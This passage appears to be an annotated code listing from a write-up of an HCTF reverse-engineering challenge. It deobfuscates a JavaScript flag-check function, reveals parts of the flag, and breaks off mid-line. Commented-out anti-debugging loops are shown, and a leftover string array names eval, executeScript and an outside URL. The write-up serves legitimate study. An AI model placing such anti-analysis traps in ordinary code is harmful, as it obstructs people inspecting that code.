class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 洗牌</span></span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="keyword">function</span> (<span class="params">_0x1661d3</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">_0x5e3956</span>(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数组内容</span></span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x180a[_0x5c351c - <span class="number">0x0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主要的 check 函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">input</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x0&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x3&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x5&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x6&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x7&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x8&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x9&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xa&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xb&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xc&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xd&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xe&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xf&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x10&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x12&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x13&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x14&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x15&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x16&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x17&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x19&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1a&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1b&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1c&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1e&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x21&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x22&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x23&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x24&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x26&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x27&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x28&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = input[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);  <span class="comment">// 获取输入的前四位，hctf&#123;</span></span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(<span class="title function_">btoa</span>(_0x50559f), <span class="number">0x20</span>);  <span class="comment">// Base64 编码，转成 int</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(_0x5cea12);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 启动 Debugger，干扰 console，但是对输入没有任何影响</span></span><br><span class="line"><span class="comment">        eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) &#123;</span></span><br><span class="line"><span class="comment">            _0x2d59cf = function (_0x4be75f) &#123;</span></span><br><span class="line"><span class="comment">                return _0x4be75f[&#x27;toString&#x27;](_0x177f13);</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            if (!&#x27;&#x27; [&#x27;replace&#x27;](/^/, String)) &#123;</span></span><br><span class="line"><span class="comment">                while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span></span><br><span class="line"><span class="comment">                _0x802d91 = [</span></span><br><span class="line"><span class="comment">                    function (_0x5e8f1a) &#123;</span></span><br><span class="line"><span class="comment">                        return _0x2829f2[_0x5e8f1a];</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                ];</span></span><br><span class="line"><span class="comment">                _0x2d59cf = function () &#123;</span></span><br><span class="line"><span class="comment">                    return _0xa180(&#x27;0x2b&#x27;);</span></span><br><span class="line"><span class="comment">                &#125;;</span></span><br><span class="line"><span class="comment">                _0x46da6f = 0x1;</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            while (_0x46da6f--)</span></span><br><span class="line"><span class="comment">                if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(&#x27;0x2c&#x27;)](new RegExp(&#x27;\x5cb&#x27; + _0x2d59cf(_0x46da6f) + &#x27;\x5cb&#x27;, &#x27;g&#x27;), _0x802d91[_0x46da6f]);</span></span><br><span class="line"><span class="comment">            return _0x200db2;</span></span><br><span class="line"><span class="comment">        &#125;(_0xa180(&#x27;0x2d&#x27;), 0x11, 0x11, _0xa180(&#x27;0x2e&#x27;)[&#x27;split&#x27;](&#x27;|&#x27;), 0x0, &#123;&#125;));</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新洗牌，保证输入的前四位是 hctf&#123;</span></span><br><span class="line">        (<span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="keyword">function</span> (<span class="params">_0x3aba26</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="title function_">_0xaed809</span>(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数组内容</span></span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="keyword">function</span> (<span class="params">_0x3120e0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x2e2f8d[<span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>)];</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字符串转十六进制</span></span><br><span class="line">        <span class="keyword">var</span> stringToHex = <span class="keyword">function</span> (<span class="params">_0x52ba71</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                char = _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](i)</span><br><span class="line">                result += char[<span class="title function_">_0x43c8d1</span>(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将输入按照“_”分割</span></span><br><span class="line">        <span class="keyword">var</span> inputs = input[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> a = inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x2</span>);  <span class="comment">// 第一段的最后两个字符</span></span><br><span class="line">        <span class="keyword">var</span> b = inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>);  <span class="comment">// 第一段的第五个字符，也就是“&#123;”</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// (第一段的最后两个字符 ^ &#x27;&#123;&#x27;) % 第一段长度 == 5</span></span><br><span class="line">        <span class="keyword">var</span> challenge1 = (</span><br><span class="line">                <span class="title function_">stringToHex</span>(a) ^ <span class="title function_">stringToHex</span>(b)</span><br><span class="line">                <span class="comment">// 第一段的长度</span></span><br><span class="line">            ) % inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] == <span class="number">0x5</span>;  <span class="comment">// 第一段长度大于 5</span></span><br><span class="line">        <span class="comment">// 第一个判断条件，确定第一段的字符为 hctf&#123;</span></span><br><span class="line">        <span class="comment">// if (!challenge1) &#123;</span></span><br><span class="line">            <span class="comment">// return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base32 编码</span></span><br><span class="line">        b2c = <span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="title class_">Math</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 启动 Debugger，干扰 console</span></span><br><span class="line"><span class="comment">            (function () &#123;</span></span><br><span class="line"><span class="comment">                (function _0x3c3bd8() &#123;</span></span><br><span class="line"><span class="comment">                    try &#123;</span></span><br><span class="line"><span class="comment">                        (function _0x4dc510(_0x460a91) &#123;</span></span><br><span class="line"><span class="comment">                            if ((&#x27;&#x27; + _0x460a91 / _0x460a91)[_0xa180(&#x27;0x30&#x27;)] !== 0x1 || _0x460a91 % 0x14 === 0x0) &#123;</span></span><br><span class="line"><span class="comment">                                (function () &#123;&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)());</span></span><br><span class="line"><span class="comment">                            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                                debugger;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                            _0x4dc510(++_0x460a91);</span></span><br><span class="line"><span class="comment">                        &#125;(0x0));</span></span><br><span class="line"><span class="comment">                    &#125; catch (_0x30f185) &#123;</span></span><br><span class="line"><span class="comment">                        setTimeout(_0x3c3bd8, 0x1388);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;());</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            &#125;());</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第三段 base32 编码，去除等号</span></span><br><span class="line">        a = <span class="title function_">b2c</span>(inputs[<span class="number">0x2</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge2 = <span class="title function_">stringToHex</span>(a) ^ <span class="number">0x53a3f32</span>;  <span class="comment">// a = 0x53a3f32 ^ 0x4b7c0a73 = 0x4e463541 = &#x27;NF5A====&#x27; = &#x27;iz&#x27;</span></span><br><span class="line">        <span class="comment">// 第二个判断条件，确定第三段的字符为 iz</span></span><br><span class="line">        <span class="keyword">if</span> (challenge2 != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第四段 base32 编码，去除等号</span></span><br><span class="line">        a = <span class="title function_">b2c</span>(inputs[<span class="number">0x3</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge3 = <span class="title function_">stringToHex</span>(a) ^ challenge2;  <span class="comment">// a = 0x4b7c0a73 ^ 0x4315332 = &#x27;OMYA====&#x27; = &#x27;s0&#x27;</span></span><br><span class="line">        <span class="comment">// 第三个判断条件，确定第四段的字符为 s0</span></span><br><span class="line">        <span class="keyword">if</span> (challenge3 != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0x4315332 * 0x4b7c0a73 * 第一段的长度</span></span><br><span class="line">        n = challenge3 * challenge2 * inputs[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line"></span><br><span class="line">        h = <span class="keyword">function</span> (<span class="params">seq, callback</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; seq[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                result += <span class="title function_">callback</span>(seq[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二段以“3”进行分割</span></span><br><span class="line">        j = inputs[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="comment">// 分割后的第一段和第二段长度相等</span></span><br><span class="line">        challenge4_1 = j[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 异或以后等于 0x1613</span></span><br><span class="line">        challenge4_2 = (<span class="title 